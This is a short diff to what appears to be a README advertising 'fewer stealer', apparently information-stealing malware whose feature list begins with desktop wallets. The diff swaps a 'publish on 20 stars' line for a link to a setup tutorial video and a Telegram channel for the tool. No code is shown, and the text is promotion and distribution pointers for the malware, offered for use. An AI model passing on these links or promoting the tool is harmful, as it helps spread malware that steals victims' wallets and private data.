@@ -1,4 +1,6 @@
-It will be publish on 20 stars
+Tutorial video on setting up fewer stealer 
+https://streamable.com/2n8j4e
+fewer stealer telegram : https://t.me/fewerstealerv2
 
 📝 Features
 🧊 Desktop wallets
